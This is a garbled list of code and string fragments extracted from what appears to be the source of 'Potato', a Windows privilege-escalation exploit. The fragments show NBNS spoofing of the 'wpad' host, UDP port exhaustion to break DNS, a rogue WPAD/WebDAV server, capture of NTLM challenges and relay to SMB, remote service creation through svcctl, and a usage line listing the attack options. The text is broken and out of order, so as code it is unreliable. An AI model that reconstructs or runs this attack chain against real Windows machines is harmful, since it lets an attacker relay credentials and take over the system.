"("""""
"(""-"", "","""
"(""."", """", """""
"(""1.0.*"""
"(""1.0.0.0"""
"(""<?xml version='1.0' encoding='UTF-8'?><ns0:multistatus xmlns:ns0=\""DAV:\""><ns0:response><ns0:href>/test/</ns0:href><ns0:propstat><ns0:prop><ns0:resourcetype><ns0:collection /></ns0:resourcetype><ns0:creationdate>2015-08-03T14:53:38Z</ns0:creationdate><ns0:getlastmodified>Tue, 11 Aug 2015 15:48:25 GMT</ns0:getlastmodified><ns0:displayname>test</ns0:displayname><ns0:lockdiscovery /><ns0:supportedlock><ns0:lockentry><ns0:lockscope><ns0:exclusive /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry><ns0:lockentry><ns0:lockscope><ns0:shared /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry></ns0:supportedlock></ns0:prop><ns0:status>HTTP/1.1 200 OK</ns0:status></ns0:propstat></ns0:response></ns0:multistatus>"""
"(""Attempting to schedule a task..."""
"(""C:\\Windows\\System32\\cmd.exe"", auth, cmd"
"(""Checking for windows defender updates..."""
"(""Clearing dns and nbns cache..."""
"(""Couldn't bind to a UDP port ""+i"
"(""DNS lookup fails - UDP Exhaustion worked!"""
"(""DNS lookup succeeds - UDP Exhaustion failed!"""
"(""Enabling WebClient service..."""
"(""Exhausting UDP source ports so DNS lookups will fail..."""
"(""Failed to bind to "" + port + "" during cleanup..."""
"(""Failed"""
"(""GETHASHES"""
"(""Got "" + hostIp[0].ToString("
"(""Got "" + request.HttpMethod + "" for "" + request.Url.AbsoluteUri.ToString("
"(""Got PROPFIND for ""+request.Url.AbsoluteUri.ToString("
"(""Got PROPFIND for /test... Responding"""
"(""Got Request: ""+request.HttpMethod+"" ""+request.Url.AbsoluteUri.ToString("
"(""Got SMB challenge "" + Convert.ToBase64String(challenge"
"(""Got request for hashes..."""
"(""HH:mm"""
"(""Listening..."""
"(""Location"", ""http://localhost:""+srvPort+""/GETHASHES""+sess"
"(""Microsoft"""
"(""Parsing final auth..."""
"(""Parsing initial NTLM auth...\n""+authHeader"
"(""Potato"""
"(""Redirecting to target..""+response.Headers[""Location""]"
"(""Sending 401..."""
"(""Setting up SMB relay..."""
"(""Spoofed target "" + spoof_host + "" succesfully..."""
"(""Spoofing wpad..."""
"(""Starting NBNS spoofer...""+spoof_host+"" = ""+spoof_address"
"(""Successfully started service"""
"(""UDP Ports exhausted..."""
"(""Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -spoof_address <default, localip> -wpad_exclude <comma separated host to exclude, optional> -schedule_task <true/false, Win10 only, optional> -srv_port <port for webserver to listen, default 80>"""
"(""WWW-Authenticate"",""NTLM "" + Convert.ToBase64String(challenge"
"(""WWW-Authenticate"",""NTLM"""
"(""b98c9d27-813b-4fba-8e80-76d23e63dc2f"""
"(""dnsapi.dll"", EntryPoint = ""DnsFlushResolverCache"""
"(""head"""
"(""http://127.0.0.1/wpad.dat"""
"(""http://localhost/test"""
"(""microsoft.com"""
"(""ncacn_np:"" + host + ""[\\pipe\\svcctl]"", auth"
"(""propfind"""
"(""smb://127.0.0.1/C$/Windows/System32/utilman.exe"", auth"
"(""wpad"""
"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
"(','"
"().Contains(""favicon"""
"().Equals(""get"""
"().Equals(""http://wpad/wpad.dat"""
"().Equals(""options"""
"().Equals(""post"""
"().Equals(""put"""
"(0, hex.Length"
"(1, 1000000"
"(1,10000000"
"(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp"
"(File.Exists(""C:\\Program Files\\Windows Defender\\MpCmdRun.exe"""
"(IPAddress.Any, i"
"(IPAddress.Loopback, port"
"(Queue<byte[]> ntlmQueue,String cmd"
"(String binPath, NtlmPasswordAuthentication auth,String cmd"
"(String cmd,String[] wpad_exclude,int port"
"(String host,String address"
"(String host,String ip"
"(String localIp, String spoof_host,String spoof_address, bool disableExhaust"
"(String target_ip,String spoof_host,String spoof_address, bool disableExhaust"
"(System.Text.Encoding.Unicode.GetBytes(""start cmd.exe /k \""whoami\"""""
"(argDict.ContainsKey(""cmd"""
"(argDict.ContainsKey(""disable_defender"""
"(argDict.ContainsKey(""disable_exhaust"""
"(argDict.ContainsKey(""disable_spoof"""
"(argDict.ContainsKey(""ip"""
"(argDict.ContainsKey(""schedule_task"""
"(argDict.ContainsKey(""spoof_address"""
"(argDict.ContainsKey(""spoof_host"""
"(argDict.ContainsKey(""srv_port"""
"(argDict.ContainsKey(""wpad_exclude"""
"(argDict[""srv_port""]"
"(cmd,wpad_exclude,srvPort"
"(createServiceWRpc.retval, true"
"(disable_defender == null || disable_defender.Equals(""false"""
"(disable_exhaust != null && disable_exhaust.Equals(""true"""
"(disable_spoof == null || disable_spoof.Equals(""false"""
"(dnsDomainIs(host, \"""" + wpad_exclude[i] + ""\"""
"(dnsDomainIs(host, \""localhost\"""
"(header.StartsWith(""NTLM """
"(headers[""Authorization""] == null && workingUri == null"
"(ip,spoof_host,spoof_address, disableExhaust"
"(ntlmQueue,this.cmd"
"(object sender, HttpRequestEventArgs e"
"(openSCManagerRpc.retval, true"
"(packet, packet.Length"
"(schedule_task != null && schedule_task.Equals(""true"""
"(serverAddr, 137"
"(spoof_host,spoof_address"
"(svcHandle, 0, new String[0]"
"(url,host"
"(x => Convert.ToByte(hex.Substring(x, 2"
(!NBNSSpoofer.doneUdp
(!disableExhaust
(!success
('$(MSBuildExtensionsPath
('.'
((
((host[i]&0xF
((host[i]>>4
()
()5
(*(:(C(N(((((((((1
(0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020
(1
(137
(2000
(5000
(Configuration
(Convert.ToBase64String(ntlmBlock
(Exception e
(MSBuildExtensionsPath
(MSBuildToolsPath
(MSBuildToolsVersion
(NBNSSpoofer.doneUdp == false
(Platform
(ProjectConfigurationPlatforms
(SmbException ex
(SolutionConfigurationPlatforms
(SolutionProperties
(String header
(String key in headers
(System.Collections.Specialized.NameValueCollection headers
(a((((K
(address
(args
(args.Length % 2 == 0 && args.Length > 0
(args[i].Substring(1
(authHeader
(ba
(byte
(byte i = 0; i < 255; i++
(byte j = 0; j < 255; j++
(byte[] ba
(challenge != null
(checkStatus[0] == 99
(count > 500
(createServiceWRpc
(createServiceWRpc.retval != 0
(endPoint
(endp
(ex.Message
(f
(false
(header.Substring(5
(host
(hostIp == null || hostIp.Length == 0 || !hostIp[0].ToString(
(i
(i != leave && i != 53
(i = 0; i <= 65535; i++
(i*2
(int i = 0; i < wpad_exclude.Length;i++ 
(int i=0;i<args.Length;i=i+2
(int i=0;i<host.Length;i++
(int j=0;j<15-host.Length;j=j+1
(int leave
(int port
(int port in failedPorts
(ip == null
(new Config.QueuedNtlmContextFactoryImpl(
(new byte[] { 00 }
(new byte[] { 99 }
(ntlmBlock
(ntlmBlock != null && (workingUri == null || workingUri == request.Url.AbsoluteUri.ToString(
(ntlmBlock[8] == 3
(openSCManagerRpc
(openSCManagerRpc.retval != 0
(openServiceRpc
(openServiceRpc.retval == 1060
(port
(request.HttpMethod.ToLower(
(request.Url.AbsoluteUri.ToString(
(responseTxt
(scManagerHandle
(segments[0]
(segments[1]
(segments[2]
(segments[3]
(sock
(srvPort
(startInfo3.Arguments
(startServiceRpc
(state == 0
(state == 1 && request.Url.AbsoluteUri.ToString(
(status
(string hex
(string[] args
(target_ip
(true
(var writer = new StreamWriter(e.Response.OutputStream
(workingUri
(workingUri == null && !request.Url.AbsoluteUri.ToString(
(x => x % 2 == 0
(x86
